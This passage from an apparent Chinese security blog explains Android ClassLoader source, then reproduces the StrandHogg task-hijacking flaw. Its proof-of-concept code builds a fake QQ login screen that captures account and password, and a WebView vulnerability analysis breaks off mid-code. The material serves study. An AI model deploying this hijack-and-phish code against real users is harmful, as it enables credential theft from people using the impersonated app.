class="hljs-comment">//路径：/libcore/ojluni/src/main/java/java/lang/ClassLoader.java</span><br><span class="hljs-keyword">protected</span> Class&lt;?&gt; loadClass(String name, <span class="hljs-type">boolean</span> resolve)<br>    <span class="hljs-keyword">throws</span> ClassNotFoundException<br>&#123;<br>    <span class="hljs-comment">// 先检查是否已经加载过了该类</span><br>    Class&lt;?&gt; c = findLoadedClass(name);<br>    <span class="hljs-keyword">if</span> (c == <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">if</span> (parent != <span class="hljs-literal">null</span>) &#123;<span class="hljs-comment">//没有加载该类，且存在父加载器，交给父加载器处理</span><br>                c = parent.loadClass(name, <span class="hljs-literal">false</span>);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<span class="hljs-comment">//没有加载该类，且不存在父加载器</span><br>                c = findBootstrapClassOrNull(name);<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;<br>            <span class="hljs-comment">// ClassNotFoundException thrown if class not found</span><br>            <span class="hljs-comment">// from the non-null parent class loader</span><br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (c == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-comment">//父加载器处理失败，自己来找</span><br>            c = findClass(name);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> c;<br>&#125;<br><br><span class="hljs-keyword">private</span> Class&lt;?&gt; findBootstrapClassOrNull(String name)<br>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>&#125;<br></code></pre></td></tr></table></figure>



<p>调用findLoadClass()方法查看本身有没有加载过该类。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//路径：/libcore/ojluni/src/main/java/java/lang/ClassLoader.java</span><br><span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> Class&lt;?&gt; findLoadedClass(String name) &#123;<br>    ClassLoader loader;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span> == BootClassLoader.getInstance())<br>        loader = <span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">else</span><br>        loader = <span class="hljs-built_in">this</span>;<br>    <span class="hljs-keyword">return</span> VMClassLoader.findLoadedClass(loader, name);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>继而调用VMclassLoader的findLoaledClass()方法（这个方法需要在native层实现。）</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//路径：/libcore/libart/src/main/java/java/lang/VMClassLoader.java</span><br><span class="hljs-keyword">native</span> <span class="hljs-keyword">static</span> Class <span class="hljs-title function_">findLoadedClass</span><span class="hljs-params">(ClassLoader cl, String name)</span>;<br></code></pre></td></tr></table></figure>



<p>findClass()</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//路径：/libcore/ojluni/src/main/java/java/lang/ClassLoader.java</span><br><span class="hljs-keyword">protected</span> Class&lt;?&gt; findClass(String name) <span class="hljs-keyword">throws</span> ClassNotFoundException &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassNotFoundException</span>(name); <span class="hljs-comment">//抛出异常</span><br>&#125;  <br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">protected</span> Class&lt;?&gt; findClass(String name) <span class="hljs-keyword">throws</span> ClassNotFoundException &#123;<br>    <span class="hljs-keyword">return</span> Class.classForName(name, <span class="hljs-literal">false</span>, <span class="hljs-literal">null</span>);    <span class="hljs-comment">//调用classForName方法（native）</span><br>&#125;<br><span class="hljs-comment">//路径：/libcore/ojluni/src/main/java/java/lang/Class.java</span><br><span class="hljs-keyword">static</span> <span class="hljs-keyword">native</span> Class&lt;?&gt; classForName(String className, <span class="hljs-type">boolean</span> shouldInitialize,<br>                                    ClassLoader classLoader) <span class="hljs-keyword">throws</span> ClassNotFoundException;<br></code></pre></td></tr></table></figure>

<p>第一个findclass方法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//路径：/libcore/dalvik/src/main/java/dalvik/system/BaseDexClassLoader.java</span><br><span class="hljs-keyword">protected</span> Class&lt;?&gt; findClass(String name) <span class="hljs-keyword">throws</span> ClassNotFoundException &#123;<br>    List&lt;Throwable&gt; suppressedExceptions = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;Throwable&gt;();<br>    <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> pathList.findClass(name, suppressedExceptions);<br>    <span class="hljs-keyword">if</span> (c == <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-type">ClassNotFoundException</span> <span class="hljs-variable">cnfe</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassNotFoundException</span>(<span class="hljs-string">&quot;Didn&#x27;t find class \&quot;&quot;</span> + name + <span class="hljs-string">&quot;\&quot; on path: &quot;</span> + pathList);<br>        <span class="hljs-keyword">for</span> (Throwable t : suppressedExceptions) &#123;<br>            cnfe.addSuppressed(t);<br>        &#125;<br>        <span class="hljs-keyword">throw</span> cnfe;<br>    &#125;<br>    <span class="hljs-keyword">return</span> c;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-title function_">BaseDexClassLoader</span><span class="hljs-params">(String dexPath, File optimizedDirectory, String librarySearchPath, ClassLoader parent)</span> &#123;<br>    <span class="hljs-built_in">super</span>(parent);<br>    <span class="hljs-built_in">this</span>.pathList = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DexPathList</span>(<span class="hljs-built_in">this</span>, dexPath, librarySearchPath, <span class="hljs-literal">null</span>);<br>    <span class="hljs-keyword">if</span> (reporter != <span class="hljs-literal">null</span>) &#123;<br>        reporter.report(<span class="hljs-built_in">this</span>.pathList.getDexPaths());<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-title function_">BaseDexClassLoader</span><span class="hljs-params">(ByteBuffer[] dexFiles, ClassLoader parent)</span> &#123;<br>    <span class="hljs-built_in">super</span>(parent);<br>    <span class="hljs-built_in">this</span>.pathList = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DexPathList</span>(<span class="hljs-built_in">this</span>, dexFiles);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>该方法调用了pathlist的findclass()方法，这个pathlist是在BaseDexClassLoader实例初始化创建的，是一个DexPathList对象，对应的findClass()方法代码如下</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//路径：/libcore/dalvik/src/main/java/dalvik/system/DexPathList.java</span><br><span class="hljs-keyword">public</span> Class&lt;?&gt; findClass(String name, List&lt;Throwable&gt; suppressed) &#123;<br>    <span class="hljs-keyword">for</span> (Element element : dexElements) &#123;<br>        Class&lt;?&gt; clazz = element.findClass(name, definingContext, suppressed);<br>        <span class="hljs-keyword">if</span> (clazz != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">return</span> clazz;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (dexElementsSuppressedExceptions != <span class="hljs-literal">null</span>) &#123;<br>        suppressed.addAll(Arrays.asList(dexElementsSuppressedExceptions));<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>遍历Element数组dexElements，并对每个元素调用器findClass()方法</p>
<p><a target="_blank" rel="noopener" href="https://gal2xy.github.io/2023/11/25/Android%E4%B8%AD%E7%9A%84ClassLoader/#%E5%9B%9B%E3%80%81ClassLoader%E5%8A%A0%E8%BD%BD%E7%B1%BB%E7%9A%84%E8%BF%87%E7%A8%8B">Android中的ClassLoader - gla2xy’s blog (gal2xy.github.io)</a></p>
<p><a target="_blank" rel="noopener" href="https://gal2xy.github.io/2023/12/10/Android%E7%AC%AC%E4%BA%8C%E4%BB%A3%E5%8A%A0%E5%9B%BA%E5%A3%B3%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%AE%9E%E7%8E%B0/">Android第二代加固壳的原理及实现 —— 不落地加载 - gla2xy’s blog (gal2xy.github.io)</a></p>
<hr>
<h4 id="安卓漏洞分析"><a href="#安卓漏洞分析" class="headerlink" title="安卓漏洞分析"></a>安卓漏洞分析</h4><h5 id="StrandHogg漏洞复现及原理分析"><a href="#StrandHogg漏洞复现及原理分析" class="headerlink" title="StrandHogg漏洞复现及原理分析"></a>StrandHogg漏洞复现及原理分析</h5><p><strong>漏洞概述：</strong></p>
<p>   StrandHogg 攻击&#x2F;任务相关性漏洞是因 Android 处理多个任务的方式（尤其是称为“更改父级任务”的功能）存在设计上的 bug 而产生&#x2F;引起的。应用更改父级任务是一项功能，可让应用将某个 activity 从一个任务移至另一个任务。</p>
<p>StrandHogg 攻击利用了传入应用任务堆栈 activity 审查方式不明确的缺陷，致使恶意应用可以执行以下任一操作：</p>
<ul>
<li>将恶意 activity 移入或移出受害堆栈</li>
<li>受害 activity 运行完毕后，将恶意 activity 设置为返回堆栈。</li>
</ul>
<p>攻击者通过操纵 <code>allowTaskReparenting</code> 和 <code>taskAffinity</code> 设置来利用此漏洞。</p>
<p><img src="image-20240412175652802.png" srcset="/img/loading.gif" lazyload alt="image-20240412175652802"></p>
<p><strong>漏洞复现：</strong></p>
<p>漏洞环境nexus5x  Android6</p>
<p><img src="image-20240411205836609.png" srcset="/img/loading.gif" lazyload alt="image-20240411205836609"></p>
<p><img src="image-20240411205858080.png" srcset="/img/loading.gif" lazyload alt="image-20240411205858080"></p>
<p><strong>漏洞分析：</strong></p>
<p><strong>AndroidManifest.xml</strong></p>
<p>XML声明:</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br></code></pre></td></tr></table></figure>

<p>这是每个XML文件的标准开头，指定了XML的版本和字符编码</p>
<p>Manifest标签:</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">manifest</span> <span class="hljs-attr">xmlns:android</span>=<span class="hljs-string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">package</span>=<span class="hljs-string">&quot;com.vuln.strandhogg&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>Manifest标签是AndroidManifest.xml文件的根元素，它声明了应用的包名<code>com.vuln.strandhogg</code>，和Android XML命名空间。</p>
<p>Application标签:</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">application</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:allowBackup</span>=<span class="hljs-string">&quot;true&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:icon</span>=<span class="hljs-string">&quot;@mipmap/ic_launcher&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:label</span>=<span class="hljs-string">&quot;@string/app_name&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:roundIcon</span>=<span class="hljs-string">&quot;@mipmap/ic_launcher_round&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:supportsRtl</span>=<span class="hljs-string">&quot;true&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:theme</span>=<span class="hljs-string">&quot;@style/AppTheme&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>Application标签定义了整个应用级别的属性，如是否允许用户备份应用数据，应用图标和名称，是否支持RTL布局方式，以及应用的主题样式。</p>
<p>Activity标签:</p>
<ul>
<li>MainActivity Activity</li>
</ul>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">activity</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;.MainActivity&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">intent-filter</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;android.intent.action.MAIN&quot;</span> /&gt;</span><br><br>        <span class="hljs-tag">&lt;<span class="hljs-name">category</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;android.intent.category.LAUNCHER&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">intent-filter</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">activity</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>这定义了一个主Activity（应用的入口点）。Intent-filter指明了这个Activity应该响应的intent类型，<code>android.intent.action.MAIN</code>和<code>android.intent.category.LAUNCHER</code>表示这个Activity是应用的启动Activity。</p>
<ul>
<li>Innocent Activity</li>
</ul>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">activity</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;.Innocent&quot;</span>/&gt;</span><br></code></pre></td></tr></table></figure>

<p>这简单地定义了一个额外的Activity，没有特别的intent-filter。</p>
<ul>
<li>Attack Activity</li>
</ul>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">activity</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;.Attack&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:taskAffinity</span>=<span class="hljs-string">&quot;com.tencent.qqlite&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:allowTaskReparenting</span>=<span class="hljs-string">&quot;true&quot;</span>/&gt;</span><br></code></pre></td></tr></table></figure>

<p>这个Activity具有特定的<code>taskAffinity</code>，可能是用于冒充或与另一个应用程序关联，具有<code>allowTaskReparenting</code>属性，这意味着它可以在任务之间移动。</p>
<p><strong>com&#x2F;vuln&#x2F;strandhogg&#x2F;MainActivity.java</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.vuln.strandhogg;<br><br><span class="hljs-keyword">import</span> androidx.appcompat.app.AppCompatActivity;<br><br><span class="hljs-keyword">import</span> android.content.Intent;<br><span class="hljs-keyword">import</span> android.os.Bundle;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MainActivity</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AppCompatActivity</span> &#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onCreate</span><span class="hljs-params">(Bundle savedInstanceState)</span> &#123;<br>        <span class="hljs-built_in">super</span>.onCreate(savedInstanceState);<br>        <span class="hljs-comment">//setContentView(R.layout.activity_main);</span><br>       <br>        <br>        <span class="hljs-comment">//声明了两个Intent变量，innocent和attack。Intent是Android中用于请求动作的对象。</span><br>        Intent innocent,attack;                     <br>       <br>        <span class="hljs-comment">//实例化了attack意图，并指定要启动的Attack类。</span><br>        attack=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Intent</span>(<span class="hljs-built_in">this</span>,Attack.class);   <br>      <br>        <br>        <span class="hljs-comment">//给attack意图添加了一个标志，指示活动应在新的tesk中启动。</span><br>        attack.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);<br>        <br>        <span class="hljs-comment">//给attack意图添加了一个标志，用于取消活动启动时的过渡动画。</span><br>        attack.addFlags(Intent.FLAG_ACTIVITY_NO_ANIMATION);<br>        <br>        <span class="hljs-comment">//实例化了innocent意图，并指定要启动的Innocent类。给innocent意图添加了一个标志，指示活动同样应在新的任务中启动。</span><br>        innocent=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Intent</span>(<span class="hljs-built_in">this</span>,Innocent.class);<br>        innocent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);<br>        startActivities(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Intent</span>[]&#123;attack,innocent&#125;);<span class="hljs-comment">//先后启动attack活动与innocent活动</span><br>        finish();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>



<p><strong>com&#x2F;vuln&#x2F;strandhogg&#x2F;Attack.java</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.vuln.strandhogg;<br><br><span class="hljs-comment">//导入了Android框架中用于界面布局和事件处理的类。Bundle用于传递数据，View是所有UI组件的基类，Button和EditText分别是按钮和文本编辑框组件。</span><br><span class="hljs-keyword">import</span> android.os.Bundle;<br><span class="hljs-keyword">import</span> android.view.View;<br><span class="hljs-keyword">import</span> android.widget.Button;<br><span class="hljs-keyword">import</span> android.widget.EditText;<br><br><br><span class="hljs-comment">//引入Android Jetpack库</span><br><br><span class="hljs-comment">// AndroidX 库中导入了 @Nullable 注解。它用于表示参数、字段或方法返回值可以为 null。</span><br><span class="hljs-keyword">import</span> androidx.annotation.Nullable;    <br><br><span class="hljs-comment">//从AndroidX AppCompat库中导入AlerDialog类，用于向用户显示对话窗口，展示信息或可选择的项目列表</span><br><span class="hljs-keyword">import</span> androidx.appcompat.app.AlertDialog;<br><br><span class="hljs-comment">//AppCompatActivity 是 Android 的 Activity 类的子类，它为旧版本的 Android 提供了兼容性支持和一些额外的功能。创建任何标准 Android 应用程序时，它是一个基本组件，因为它充当应用程序 UI 的容器。</span><br><span class="hljs-keyword">import</span> androidx.appcompat.app.AppCompatActivity;<br><br><br><span class="hljs-comment">//声明了Attack类，继承自AppCompatActivity，使其成为一个活动(Activity)。</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Attack</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AppCompatActivity</span> &#123;<br>    Button bt;<br>    EditText ed1,ed2;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onCreate</span><span class="hljs-params">(<span class="hljs-meta">@Nullable</span> Bundle savedInstanceState)</span> &#123;<br>        <span class="hljs-built_in">super</span>.onCreate(savedInstanceState);<br>        <br>        <span class="hljs-comment">//通过setContentView方法设置活动的布局，布局文件是R.layout.attack_fishing</span><br>        setContentView(R.layout.attack_fishing);<br>        <br>        <span class="hljs-comment">//调用getSupportActionBar().hide()来隐藏应用的操作栏(ActionBar)。</span><br>        getSupportActionBar().hide();<br>        <br>        <span class="hljs-comment">//通过findViewById方法初始化ed1和ed2，这两个EditText组件分别对应布局中的两个文本输入框。</span><br>        ed1=findViewById(R.id.editText);<br>        ed2=findViewById(R.id.editText2);<br>        <span class="hljs-comment">//按钮组件</span><br>        bt=findViewById(R.id.button);<br>        <span class="hljs-comment">//按钮初始化</span><br>        bt.setOnClickListener(<span class="hljs-keyword">new</span> <span class="hljs-title class_">View</span>.OnClickListener() &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onClick</span><span class="hljs-params">(View view)</span> &#123;<br>                alert(ed1.getText().toString(),ed2.getText().toString());<br>            &#125;<br>        &#125;);<br>    &#125;<br>    <br>    <span class="hljs-comment">//弹窗</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">alert</span><span class="hljs-params">(String account,String password)</span><br>    &#123;<br>        AlertDialog.Builder alert=<span class="hljs-keyword">new</span> <span class="hljs-title class_">AlertDialog</span>.Builder(Attack.<span class="hljs-built_in">this</span>);<br>        alert.setTitle(<span class="hljs-string">&quot;钓鱼攻击&quot;</span>);<br>        alert.setMessage(<span class="hljs-string">&quot;您的QQ账号:&quot;</span> + account + <span class="hljs-string">&quot;\n您的QQ密码:&quot;</span> + password);<br>        alert.setPositiveButton(<span class="hljs-string">&quot;OK&quot;</span>,<span class="hljs-literal">null</span>);<br>        alert.show();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>



<p>com&#x2F;vuln&#x2F;strandhogg&#x2F;Innocent.java  启动时的弹窗</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.vuln.strandhogg;<br><br><span class="hljs-keyword">import</span> android.content.DialogInterface;<br><span class="hljs-keyword">import</span> android.os.Bundle;<br><br><span class="hljs-keyword">import</span> androidx.annotation.Nullable;<br><span class="hljs-keyword">import</span> androidx.appcompat.app.AlertDialog;<br><span class="hljs-keyword">import</span> androidx.appcompat.app.AppCompatActivity;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Innocent</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AppCompatActivity</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onCreate</span><span class="hljs-params">(<span class="hljs-meta">@Nullable</span> Bundle savedInstanceState)</span> &#123;<br>        <span class="hljs-built_in">super</span>.onCreate(savedInstanceState);<br>        setContentView(R.layout.activity_main);<br>        AlertDialog.Builder alert=<span class="hljs-keyword">new</span> <span class="hljs-title class_">AlertDialog</span>.Builder(<span class="hljs-built_in">this</span>);<br>        alert.setTitle(<span class="hljs-string">&quot;Innocent&quot;</span>);<br>        alert.setMessage(<span class="hljs-string">&quot;对于用户来说,此活动完全无害&quot;</span>);<br>        alert.setPositiveButton(<span class="hljs-string">&quot;OK&quot;</span>,<span class="hljs-literal">null</span>);<br>        alert.show();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>





<h5 id="Android-WebView漏洞-CVE-2017-13156"><a href="#Android-WebView漏洞-CVE-2017-13156" class="headerlink" title="Android WebView漏洞(CVE-2017-13156)"></a>Android WebView漏洞(CVE-2017-13156)</h5><p><strong>项目地址</strong>：<a target="_blank" rel="noopener" href="https://github.com/t4kemyh4nd/vulnwebview">https://github.com/t4kemyh4nd/vulnwebview</a></p>
<p><strong>代码分析</strong>：</p>
<p>AndroidManifest.xml</p>
<p><img src="image-20240410183242166-17127451645171.png" srcset="/img/loading.gif" lazyload alt="image-20240410183242166"></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">Android:exported=&quot;ture&quot;  //可导出状态<br></code></pre></td></tr></table></figure>

<p>来到<code>com.tmh.vulnwebview.RegistrationWevView</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.tmh.vulnwebview;  <span class="hljs-comment">//包名所在</span><br><span class="hljs-comment">//引入Android api</span><br><span class="hljs-keyword">import</span> android.os.Bundle;<br><span class="hljs-keyword">import</span> android.util.Log;<br><span class="hljs-keyword">import</span> android.webkit.ConsoleMessage;<br><span class="hljs-keyword">import</span> android.webkit.WebChromeClient;<br><span class="hljs-keyword">import</span> android.webkit.WebView;<br><span class="hljs-keyword">import</span> android.webkit.WebViewClient;<br><span class="hljs-keyword">import</span> androidx.appcompat.app.AppCompatActivity;<br><br><span class="hljs-comment">//定义了RegistrationWebView的类，继承来自AppCompatActivvity</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RegistrationWebView</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AppCompatActivity</span> &#123;<br>  <br>    <span class="hljs-meta">@Override</span> <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onCreate</span><span class="hljs-params">(Bundle savedInstanceState)</span> &#123;<br>        <span class="hljs-built_in">super</span>.onCreate(savedInstanceState); <span class="hljs-comment">//调用父类的onCreate方法</span><br>        